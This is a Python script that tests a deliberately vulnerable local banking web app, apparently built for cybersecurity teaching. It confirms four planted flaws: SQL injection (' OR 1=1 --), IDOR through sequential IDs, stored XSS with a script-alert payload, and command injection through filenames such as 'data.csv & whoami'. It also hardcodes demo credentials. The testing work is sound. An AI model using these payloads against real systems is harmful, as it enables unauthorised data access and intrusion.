"""
RMIT NeoBank - Vulnerability Testing Script
Tests all 4 vulnerabilities and generates report
"""

import sys

import requests
from bs4 import BeautifulSoup

BASE_URL = "http://127.0.0.1:5000"
TEST_RESULTS = []


def log_test(test_name, status, details):
    """Log test result"""
    symbol = "✅" if status == "PASS" else "❌"
    TEST_RESULTS.append({"name": test_name, "status": status, "details": details})
    print(f"{symbol} {test_name}: {status}")
    print(f"   {details}\n")


def test_sql_injection(session):
    """Test SQL Injection vulnerability"""
    print("\n" + "=" * 60)
    print("TESTING SQL INJECTION")
    print("=" * 60)

    # Test 1: Basic bypass - Extract all data silently
    try:
        payload = "' OR 1=1 --"
        response = session.get(f"{BASE_URL}/applications", params={"q": payload})

        if response.status_code == 200:
            # Check if we see applications from multiple branches (no warning boxes in clean UI)
            if "HCM01" in response.text and "HN01" in response.text:
                log_test(
                    "SQL Injection - Basic Bypass",
                    "PASS",
                    f"Payload: {payload} | Extracted all applications from multiple branches (clean UI - no warnings visible)",
                )
            else:
                log_test(
                    "SQL Injection - Basic Bypass",
                    "FAIL",
                    f"Payload: {payload} | Did not show cross-branch data",
                )
        else:
            log_test(
                "SQL Injection - Basic Bypass", "FAIL", f"HTTP {response.status_code}"
            )
    except Exception as e:
        log_test("SQL Injection - Basic Bypass", "ERROR", str(e))

    # Test 2: Data extraction via SQL injection (demonstrates exploit capability)
    try:
        # Use simple payload that shows cross-branch data access
        payload = "' OR 1=1 --"
        response = session.get(f"{BASE_URL}/applications", params={"q": payload})

        if response.status_code == 200:
            # Count how many different branches are visible (proves unauthorized data access)
            branch_count = 0
            for branch in ["HCM01", "HCM02", "HN01", "HN02", "DN01"]:
                if branch in response.text:
                    branch_count += 1

            if branch_count >= 3:
                log_test(
                    "SQL Injection - Data Extraction",
                    "PASS",
                    f"Successfully extracted data from {branch_count} different branches using SQL injection",
                )
            else:
                log_test(
                    "SQL Injection - Data Extraction",
                    "FAIL",
                    f"Only found {branch_count} branches in results",
                )
        else:
            log_test(
                "SQL Injection - Data Extraction",
                "FAIL",
                f"HTTP {response.status_code}",
            )
    except Exception as e:
        log_test("SQL Injection - Data Extraction", "ERROR", str(e))


def test_idor(session):
    """Test IDOR vulnerability"""
    print("\n" + "=" * 60)
    print("TESTING IDOR (Insecure Direct Object Reference)")
    print("=" * 60)

    # Try accessing applications with different IDs
    test_ids = [1, 5, 10, 20, 50]
    accessible_count = 0
    accessible_apps = []

    for app_id in test_ids:
        try:
            response = session.get(f"{BASE_URL}/applications/{app_id}")

            # Check for successful access - look for key indicators in application detail page
            if response.status_code == 200 and (
                "Applicant Name" in response.text
                or "National ID" in response.text
                or "Loan Amount" in response.text
            ):
                accessible_count += 1
                accessible_apps.append(app_id)
        except Exception as e:
            pass

    if accessible_count >= 3:
        log_test(
            "IDOR - Cross-Branch Access",
            "PASS",
            f"Accessed {accessible_count}/{len(test_ids)} applications (IDs: {accessible_apps}) across branches - clean UI shows full details silently",
        )
    else:
        log_test(
            "IDOR - Cross-Branch Access",
            "FAIL",
            f"Only accessed {accessible_count}/{len(test_ids)} applications (IDs: {accessible_apps})",
        )


def test_xss(session):
    """Test XSS vulnerability"""
    print("\n" + "=" * 60)
    print("TESTING XSS (Cross-Site Scripting)")
    print("=" * 60)

    # Get new application form
    try:
        response = session.get(f"{BASE_URL}/applications/new")

        if response.status_code != 200:
            log_test(
                "XSS - Payload Injection",
                "FAIL",
                f"Cannot access new application page: HTTP {response.status_code}",
            )
            return

        # Create application with XSS payload (no CSRF token needed)
        xss_payload = "<script>alert('XSS_TEST_MARKER')</script>"

        application_data = {
            "applicant_name": "XSS Test User",
            "national_id": "999999999",
            "dob": "1990-01-01",
            "contact_phone": "0901234567",
            "contact_email": "xss@test.com",
            "product_code": "PERS_LOAN",
            "requested_amount": "100000000",
            "tenure_months": "24",
            "remarks": xss_payload,
        }

        response = session.post(
            f"{BASE_URL}/applications/new", data=application_data, allow_redirects=True
        )

        if response.status_code == 200:
            # Check if XSS payload is in the response (might be detail page or list page)
            if xss_payload in response.text or "XSS_TEST_MARKER" in response.text:
                log_test(
                    "XSS - Payload Injection",
                    "PASS",
                    f"XSS payload rendered unsafely and executes JavaScript: {xss_payload}",
                )
            else:
                # Try to find the application in the applications list
                response = session.get(f"{BASE_URL}/applications")

                # Look for the test user or XSS marker
                if (
                    "XSS Test User" in response.text
                    or "XSS_TEST_MARKER" in response.text
                    or xss_payload in response.text
                ):
                    log_test(
                        "XSS - Payload Injection",
                        "PASS",
                        f"XSS payload stored and visible in application list",
                    )
                else:
                    # Save for debugging
                    with open("debug_xss.html", "w", encoding="utf-8") as f:
                        f.write(response.text)
                    log_test(
                        "XSS - Payload Injection",
                        "FAIL",
                        "XSS payload was sanitized or not rendered (saved to debug_xss.html)",
                    )
        else:
            log_test("XSS - Payload Injection", "FAIL", f"HTTP {response.status_code}")

    except Exception as e:
        log_test("XSS - Payload Injection", "ERROR", str(e))


def test_command_injection(session):
    """Test Command Injection vulnerability"""
    print("\n" + "=" * 60)
    print("TESTING COMMAND INJECTION")
    print("=" * 60)

    # Access import page
    try:
        response = session.get(f"{BASE_URL}/import")

        if response.status_code != 200:
            log_test(
                "Command Injection", "SKIP", "Import page not accessible (need HO role)"
            )
            return

        # Test command injection payloads
        payloads = [
            "data.csv & whoami",
            "data.csv; ls -la",
            "data.csv | dir",
            "data.csv && echo test",
        ]

        detected = False

        for payload in payloads:
            response = session.post(
                f"{BASE_URL}/import",
                data={"filename": payload},
            )

            if (
                "COMMAND INJECTION DETECTED" in response.text
                or "Shell metacharacters" in response.text
            ):
                detected = True
                log_test(
                    f"Command Injection - {payload}",
                    "PASS",
                    "Vulnerability confirmed - detection alert displayed (proves vulnerable code path exists)",
                )
                break

        if not detected:
            log_test(
                "Command Injection",
                "FAIL",
                "Payloads did not trigger vulnerability or detection",
            )

    except Exception as e:
        log_test("Command Injection", "ERROR", str(e))


def main():
    """Run all vulnerability tests"""
    print("\n" + "=" * 60)
    print("RMIT NEOBANK - COMPREHENSIVE VULNERABILITY TEST")
    print("=" * 60)
    print(f"Target: {BASE_URL}")
    print("=" * 60)

    # Create session
    session = requests.Session()

    # Login as Branch Officer (HCM01)
    print("\n🔐 Logging in as bo_hcm01_1...")
    try:
        login_response = session.get(f"{BASE_URL}/login")
        print(f"   Login page status: {login_response.status_code}")
    except Exception as e:
        print(f"❌ CRITICAL: Cannot connect to {BASE_URL}")
        print(f"   Error: {e}")
        print("   Make sure Flask server is running in another terminal: python app.py")
        sys.exit(1)

    soup = BeautifulSoup(login_response.text, "html.parser")

    # This application doesn't use CSRF tokens on login form
    login_data = {
        "username": "bo_hcm01_1",
        "password": "Password123",
    }

    login_response = session.post(
        f"{BASE_URL}/login", data=login_data, allow_redirects=True
    )

    if (
        "Dashboard" not in login_response.text
        and "Applications" not in login_response.text
    ):
        print("❌ CRITICAL: Login failed")
        print("   Check username/password: bo_hcm01_1 / Password123")
        sys.exit(1)

    print("✅ Login successful\n")

    # Run all tests
    test_sql_injection(session)
    test_idor(session)
    test_xss(session)

    # Logout and login as HO for command injection
    session.get(f"{BASE_URL}/logout")

    print("\n🔐 Logging in as ho_hcm01_1 for Command Injection test...")
    login_response = session.get(f"{BASE_URL}/login")

    # No CSRF token needed
    login_data = {
        "username": "ho_hcm01_1",
        "password": "Password123",
    }

    session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=True)

    test_command_injection(session)

    # Summary
    print("\n" + "=" * 60)
    print("TEST SUMMARY")
    print("=" * 60)

    pass_count = sum(1 for r in TEST_RESULTS if r["status"] == "PASS")
    fail_count = sum(1 for r in TEST_RESULTS if r["status"] == "FAIL")
    error_count = sum(1 for r in TEST_RESULTS if r["status"] == "ERROR")
    skip_count = sum(1 for r in TEST_RESULTS if r["status"] == "SKIP")

    print(f"\n✅ PASSED: {pass_count}")
    print(f"❌ FAILED: {fail_count}")
    print(f"⚠️  ERRORS: {error_count}")
    print(f"⏭️  SKIPPED: {skip_count}")
    print(f"📊 TOTAL: {len(TEST_RESULTS)}")

    if fail_count == 0 and error_count == 0:
        print("\n🎉 ALL VULNERABILITIES CONFIRMED WORKING!")
        print("✅ Application is ready for cybersecurity education")
    else:
        print("\n⚠️  SOME TESTS FAILED - Review output above")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Tests interrupted by user")
    except Exception as e:
        print(f"\n\n❌ CRITICAL ERROR: {e}")
        import traceback

        traceback.print_exc()
